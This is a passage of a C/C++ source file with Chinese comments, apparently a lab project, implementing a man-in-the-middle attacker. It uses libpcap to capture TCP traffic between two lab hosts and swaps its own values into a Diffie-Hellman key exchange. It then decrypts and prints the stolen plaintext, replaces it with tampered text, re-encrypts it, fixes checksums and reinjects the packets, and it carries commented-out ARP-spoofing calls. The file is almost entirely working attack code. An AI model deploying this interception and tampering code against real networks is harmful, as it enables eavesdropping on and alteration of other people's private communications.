	putchar('\n');
	printf("已完成%s->%s的欺骗\n\n",srcip,dstip);
    close(sock_fd);
    
    return EXIT_SUCCESS;
}
bool findDev(){
	 pcap_if_t *devs;
    pcap_if_t *d;
    char errbuf[PCAP_ERRBUF_SIZE];

    // 获取所有设备
    if (pcap_findalldevs(&devs, errbuf) == -1) {
        fprintf(stderr, "pcap_findalldevs() failed: %s\n", errbuf);
        return 1;
    }

    // 检查设备是否存在
    if (devs == NULL) {
        printf("没有找到网络设备\n");
        return 1;
    }

    // 遍历所有网络设备
    for (d = devs; d != NULL; d = d->next) {
        printf("设备名称: %s\n", d->name);
        printf("设备描述: %s\n", (d->description) ? d->description : "No description available");

	}
}
unsigned char clientMac[6]={0},serverMac[6]={0};
// IP 头部结构
struct ip_header {
    unsigned char iph_ihl:4, iph_ver:4; 
    unsigned char iph_tos; 
    unsigned short iph_len; 
    unsigned short iph_id; 
    unsigned short iph_offset; 
    unsigned char iph_ttl; 
    unsigned char iph_protocol; 
    unsigned short iph_checksum; 
    unsigned int iph_sourceip; 
    unsigned int iph_destip; 
};

// TCP 头部结构
struct tcp_header {
    unsigned short th_sport; // 源端口
    unsigned short th_dport; // 目的端口
    unsigned int th_seq; // 序列号
    unsigned int th_ack; // 确认号
    unsigned char th_off:4, th_res:4; // TCP 头部长度
    unsigned char th_flags; // 标志位
    unsigned short th_win; // 窗口大小
    unsigned short th_sum; // 校验和
    unsigned short th_urp; // 紧急指针
};


// 校验和计算函数
uint16_t in_cksum(void *pkt, int len){
    uint16_t *buf = (uint16_t*)pkt;
	uint32_t cksm = 0;
	while (len > 1)
	{
		cksm += *(buf++);
		cksm = (cksm >> 16) + (cksm & 0xffff);
		len -= 2;
	}
	if (len)
	{
		cksm += *((uint8_t*)buf);
		cksm = (cksm >> 16) + (cksm & 0xffff);
	}
	return (uint16_t)((~cksm) & 0xffff);
}
HEXnum g=toHEX(0),X=toHEX(0),t,T=toHEX(0),Y=toHEX(0),K1=toHEX(0),K2,K3=toHEX(0),K4;	
void putHEX(char ret[],HEXnum x,char c){
	ret[0]=c;
	for(int i=0;i<keyLen;i++) ret[i+1]=x.num[i]+'0';
	ret[keyLen+1]=0;
}
HEXnum getHEX(char ret[]){
	HEXnum x;
	for(int i=0;i<keyLen;i++) x.num[i]=ret[i+1]-'0';
	return x;
}
void cheatChar(char s[],int len,bool flg,char ret[]){
	if(len==0){
		ret[0]=0;
		return;
	}
	if(!flg)//flg=1		服务器发送至客户端
	{
		if(s[0]=='g'){
			g=getHEX(s);
			putHEX(ret,g,'g');	
		}else if(s[0]=='p'){
			p=getHEX(s);
			putHEX(ret,p,'p');
		}else if(s[0]=='X'){
			X=getHEX(s);
			t=randHEX(toHEX(2),p-toHEX(2));
			T=hpow(g,t);
			putHEX(ret,T,'X');
		}else if(s[0]=='K'){
			K1=getHEX(s);
			K4=hpow(Y,t);
			putHEX(ret,K4,'K');
			
		}else{
			if(K1==K2&&K3==K4){
				printf("对称密钥欺骗成功！\n");
			}else{
				printf("对称密钥欺骗失败！\n");
				prtHEX(K1);
				printf("\n");
				prtHEX(K2);
				printf("\n");
				prtHEX(K3);
				printf("\n");
				prtHEX(K4);
				printf("\n");
				return;
			}
			
/*
sudo ./attacker
*/

			string txt1=decoding(s,K1);
			cout<<"窃取到明文为:"<<txt1<<endl;
			char mm[]={"error!!"};
			printf("\n中间人篡改明文为:%s\n",mm);
			string txt2=encoding(mm,K3);
			int ll=txt2.length();
            for(int i=0;i<ll;i++) ret[i]=txt2[i];
			ret[ll]=0;
			cout<<decoding(ret,K3)<<endl;

		}

	}else{
		if(s[0]=='Y'){
			Y=getHEX(s);
			putHEX(ret,T,'Y');
		}else if(s[0]=='K'){
			K3=getHEX(s);
			K2=hpow(X,t);
			putHEX(ret,K2,'K');
			
		}
	}
	printf("拦截修改后数据:%s\n",ret);
	
}

void pcap_handle(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    // 获取IP头部
    struct ip *ip_header = (struct ip *)(packet + 14); // 14 是以太网头的大小
    struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + (ip_header->ip_hl << 2)); // TCP头位置
	struct ether_header *eth_header = (struct ether_header *)packet;
	bool flg=true;
	if(!memcmp(eth_header->ether_dhost,serverMac, 6)||!memcmp(eth_header->ether_dhost,clientMac, 6)) return;
    for (int i = 0; i < 6; i++)  if(eth_header->ether_shost[i]!=serverMac[i]) flg=false;
    
    // 输出IP信息
    char src_ip[INET_ADDRSTRLEN];
    char dst_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(ip_header->ip_src), src_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(ip_header->ip_dst), dst_ip, INET_ADDRSTRLEN);
    printf("%s -> %s\n", src_ip,  dst_ip);


    // 判断是握手包、挥手包还是数据包
    if (tcp_header->syn) {
        printf("握手包(SYN)\n");
    } else if (tcp_header->fin ) {
        printf("挥手包(FIN)\n");
    } else{
        printf("数据包(Acknowledgment)\n");
    }

    // 输出TCP序列号和确认号
    printf("序列号: %u, 确认号: %u\n", ntohl(tcp_header->seq ), ntohl(tcp_header->ack_seq ));

    // 输出数据包内容（此处假设数据部分紧跟在TCP头后面）
   	u_char *data = (u_char *)(packet + 14 + (ip_header->ip_hl << 2) + (tcp_header->doff << 2));
    int data_len = pkthdr->len - (14 + (ip_header->ip_hl << 2) + (tcp_header->doff << 2));


		printf("数据长度：%d\n数据内容: \n",data_len);
		for (int i = 0;i<data_len; i++)  putchar(data[i]);
		
		printf("\n");	

    /*
	sudo ./attacker
	*/												
	if(flg) memcpy(eth_header->ether_dhost,clientMac , 6);
	else memcpy(eth_header->ether_dhost, serverMac, 6);
	
	char newData[6400];
    cheatChar((char*)data,data_len,flg,newData);
	int newLen=strlen(newData);
	
	
	printf("%d ",tcp_header->check);

  	tcp_header->check=0;
	// 构造伪头部
	struct pseudo_header {
		u_int32_t source_address;  // 源 IP 地址
		u_int32_t dest_address;    // 目标 IP 地址
		u_int8_t placeholder;      // 保留字段，通常为 0
		u_int8_t protocol;         // 协议字段，TCP 为 6
		u_int16_t tcp_length;      // TCP 数据部分的长度
	}psh;
	// 计算新的 TCP 数据部分的长度
	int new_tcp_length = (tcp_header->doff << 2) + newLen;

	psh.source_address = ip_header->ip_src.s_addr;  // 源 IP 地址
	psh.dest_address = ip_header->ip_dst.s_addr;    // 目标 IP 地址
	psh.placeholder = 0;                             // 保留字段
	psh.protocol = IPPROTO_TCP;                      // 协议类型，TCP 为 6
	psh.tcp_length = htons(new_tcp_length);  		// 新的 TCP 数据部分长度

	// 计算伪数据包的总长度
	int psize = sizeof(struct pseudo_header) + new_tcp_length;

	// 为伪数据包分配内存
	unsigned char *pseudogram = (unsigned char *)malloc(psize);
	if (pseudogram == NULL) {
		perror("Malloc failed for pseudogram");
		exit(1);
	}

	// 组合伪头部和新的 TCP 数据部分
	memcpy(pseudogram, (unsigned char *)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), packet + 14 + (ip_header->ip_hl << 2), (tcp_header->doff << 2));  // 复制原始 TCP 头部
	memcpy(pseudogram + sizeof(struct pseudo_header) + (tcp_header->doff << 2), newData, newLen);  // 复制修改后的数据

	// 计算并设置新的 TCP 校验和
	
	tcp_header->check = in_cksum((unsigned short *)pseudogram, psize);
	printf("%d\n ",tcp_header->check);
	
	u_char newPacket[65536];
	memcpy(newPacket,packet, 14 + (ip_header->ip_hl << 2)+(tcp_header->doff << 2));
	memcpy(newPacket+ 14 + (ip_header->ip_hl << 2)+(tcp_header->doff << 2),newData,newLen);

	char errbuf[PCAP_ERRBUF_SIZE], *device="ens33";
    
    // 打开网络设备
    pcap_t * phandle=pcap_open_live(device,65536,0,500,errbuf);
    if(phandle==NULL){
        printf("网络设备打开失败：");
        perror(errbuf);
        return ;
    }
    // 发送修改后的数据包
    int result = pcap_sendpacket(phandle, newPacket, pkthdr->len+newLen-data_len);
	if (result == -1) {
		printf("数据包转发失败：%s\n", pcap_geterr(phandle));
	}
	// prtpack(pkthdr->len+newLen-data_len,newPacket);
	 pcap_close(phandle);
}




bool gerPackage(){
    char errbuf[PCAP_ERRBUF_SIZE], *device="ens33";
    
    // 打开网络设备
    pcap_t * phandle=pcap_open_live(device,65536,0,500,errbuf);
    if(phandle==NULL){
        printf("网络设备打开失败：");
        perror(errbuf);
        return 1;
    }else{
        printf("成功打开网络设备！\n");
    }

    // 获得网络参数
    bpf_u_int32 ipaddress,ipmask;
    if(pcap_lookupnet(device,&ipaddress,&ipmask,errbuf)==-1){
        perror(errbuf);
        return 1;
    }
    else{
        char ip[INET_ADDRSTRLEN],mask[INET_ADDRSTRLEN];
        if(inet_ntop(AF_INET,&ipaddress,ip,sizeof(ip))==NULL)
            perror("IP地址格式错误！");
        else if(inet_ntop(AF_INET,&ipmask,mask,sizeof(mask))==NULL)
            perror("子网掩码格式错误！");
        printf("IP地址为: %s,子网掩码为: %s\n",ip,mask);
    }

    // 编译过滤策略
    struct bpf_program fcode;
    char filterString[1024]={"((src host 192.168.72.130 && src port 8080) || (dst host 192.168.72.130 && dst port 8080)) && tcp"};
    if(pcap_compile(phandle,&fcode,filterString,0,ipmask)==-1){
        fprintf(stderr,"pcap_compile: %s,please input again....\n",pcap_geterr(phandle));
        return -1;
    }

    // 设置过滤器
    if(pcap_setfilter(phandle,&fcode)==-1){
        fprintf(stderr,"pcap_setfilter: %s\n",pcap_geterr(phandle));
        return 1;
    }

    // 获取数据链路类型
    int datalink;
     if((datalink=pcap_datalink(phandle))==-1){
        fprintf(stderr,"pcap_datalink: %s\n",pcap_geterr(phandle));
        return 1;
    }
    printf("数据链路类型= %d\n",datalink);

    // 利用回调函数，捕获数据包
    pcap_loop(phandle,-1,pcap_handle,NULL);

    // 关闭网络设备
    pcap_close(phandle);
}

// int serverSocket(){

//     int server_socket = socket(AF_INET, SOCK_STREAM, 0);

// 	if (server_socket == -1)
// 	{
// 		printf("中间人——客户端套接字创建失败！\n");
// 		return -1;
// 	}

//     // 绑定端口
// 	struct sockaddr_in local= { 0 };
// 	local.sin_family = AF_INET;
// 	local.sin_port = htons(8080);
// 	local.sin_addr.s_addr = htonl(INADDR_ANY);
	
// 	// 绑定socket和端口
// 	if (bind(server_socket, (struct sockaddr*)&local, sizeof(struct sockaddr_in)) == -1)
// 	{
// 		printf("中间人——客户端socket绑定失败！\n");
// 		return -1;
// 	}

// 	// 监听这个端口
// 	if (listen(server_socket, 10) == -1)
// 	{
// 		printf("中间人——客户端socket监听失败!\n");
// 		return -1;
// 	}

//     return server_socket;
// }

// int clientSocket(char ip[]){
//     // 创建socket
// 	int client_socket = socket(AF_INET, SOCK_STREAM, 0);
// 	if (client_socket == -1)
// 	{
// 		printf("中间人——服务器socket套接字创建失败!!! \n");
// 		return -1;
// 	}

// 	// 创建目标IP和端口
// 	struct sockaddr_in target;
// 	target.sin_family = AF_INET;
// 	target.sin_port = htons(8080);
// 	target.sin_addr.s_addr = inet_addr(ip);// 目标IP地址

// 	//连接服务器
// 	if (connect(client_socket, (struct sockaddr*)&target, sizeof(struct sockaddr)) == -1)
// 	{
// 		printf("中间人——服务器连接服务器失败!!!\n");
// 		return -1;
// 	}
// 	else printf("中间人——服务器成功连接服务器!!!\n");
//     return client_socket;
// }
// void attackerAffair(int client_socket,int server_socket){
//     srand(time(0));
	
// 	// while(1){		//每进行5次通话周期性更换密钥
// 		HEXnum g=recvHEX(server_socket);
// 		p=recvHEX(server_socket);
// 		HEXnum X=recvHEX(server_socket);

//         HEXnum t=randHEX(toHEX(2),p-toHEX(2));
// 		HEXnum T=hpow(g,t);

//         sendHEX(client_socket,g);
// 		sendHEX(client_socket,p);
// 		sendHEX(client_socket,T);

// 		HEXnum Y=recvHEX(client_socket);
//         sendHEX(server_socket,T);

//         HEXnum K1=recvHEX(server_socket);
//         HEXnum K2=hpow(X,t);
// 		sendHEX(server_socket,K2);

//         HEXnum K3=recvHEX(client_socket);
// 		HEXnum K4=hpow(Y,t);
// 		sendHEX(client_socket,K4);
		
// 		if(K1==K2&&K3==K4) printf("对称密钥正确，身份验证成功!!\n");
// 		else
// 		{
// 			prtHEX(K1);
// 			putchar('\n');
// 			prtHEX(K2);
// 			putchar('\n');
// 			prtHEX(K3);
// 			putchar('\n');
// 			prtHEX(K4);
// 			putchar('\n');
// 			printf("对称密钥错误，身份验证失败!!\n");
// 			return ;
// 		}
// 		for(int i=0;i<16;i++)for(int j=0;j<16;j++) xobS[Sbox[i][j]>>4][Sbox[i][j]&15]=i*16+j;
// 		for(int i=1;i<=5;i++){
// 			char buffer[4096]={0};
// 			recv(server_socket,buffer,4096,0);
// 			string ret=decoding(buffer,K1);
// 			cout<<ret<<endl;
// 			ret="Data have been changed!"+ret;
//             for(int i=0;i<=ret.length();i++) buffer[i]=ret[i];

//             ret=encoding(buffer,K3);
//             for(int i=0;i<=ret.length();i++) buffer[i]=ret[i];
//             send(client_socket,buffer,ret.length(),0);
// 			if(ret=="exit"){
// 				close(client_socket);
// 				return;
// 			}
// 		}	
// 	// }
	
// 	close(server_socket);
// 	close(client_socket);
// }
int main() {
// 	char prime[65]={"FFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF"};
// 		p=stringTo(prime);
// 	HEXnum kk=randHEX(p>>1,p);
// 	char s[]={"123456789"};

// 	cout<<encoding(s,kk)<<endl;
// cout<<encoding(s,kk)<<endl;
// 	cout<<encoding(s,kk)<<endl;
// 	return 0;
	char clientIP[]={"192.168.72.132"},serverIP[]={"192.168.72.130"},dev[]={"ens33"};
	// arp(dev,serverIP,clientIP);
    // arp(dev,clientIP,serverIP);
	// return 0;
    
	getMac(dev,clientIP,serverIP,serverMac);
	getMac(dev,serverIP,clientIP,clientMac);
	gerPackage();
	return 0;
    

    
    
    // int server_socket=serverSocket();
   
    // if(server_socket==-1) return -1;
	// printf("中间人服务器创建成功，等待客户端连接\n");
    
    // while(1){
    //     int client_socket = accept(server_socket, NULL, NULL);
    //         if(client_socket==-1)
    //         {
    //             printf("中间人连接客户端失败!\n");
    //             continue;
    //         }
    //         else printf("%d号客户端成功连接!\n",client_socket);   
    //         int toclient_socket=clientSocket(serverIP);
    //         if(toclient_socket==-1) return -1;
    //         attackerAffair(toclient_socket,client_socket);

    // }
    
    // // arp()
    // return 0;
}
